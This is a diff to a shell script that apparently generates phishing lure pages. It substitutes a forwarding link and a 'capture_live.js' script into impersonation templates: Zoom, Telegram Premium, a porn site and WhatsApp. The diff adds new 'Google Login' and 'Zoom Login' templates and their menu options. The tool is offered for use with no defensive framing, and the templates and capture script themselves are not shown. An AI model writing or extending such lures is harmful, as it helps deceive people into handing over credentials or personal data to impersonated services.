@@ -174,6 +174,8 @@ case $option_tem in
     2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
     3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
     4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
+    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
+    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
 esac
 }
 
@@ -240,6 +242,8 @@ case $option_tem in
     2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
     3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
     4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
+    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
+    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
 esac
 }
 
@@ -257,6 +261,8 @@ printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting (Zo
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Premium\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Porn Site (FUQ)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp Group\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Google Login\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Zoom Login\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-1}"
 case $option_tem in
@@ -264,6 +270,8 @@ case $option_tem in
     2) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Telegram Premium template\e[0m\n" ;;
     3) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Porn Site template\e[0m\n" ;;
     4) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using WhatsApp Group template\e[0m\n" ;;
+    5) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Google Login template\e[0m\n" ;;
+    6) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Zoom Login template\e[0m\n" ;;
     *) printf "\e[1;93m [!] Invalid option!\e[0m\n"; select_template ;;
 esac
 }
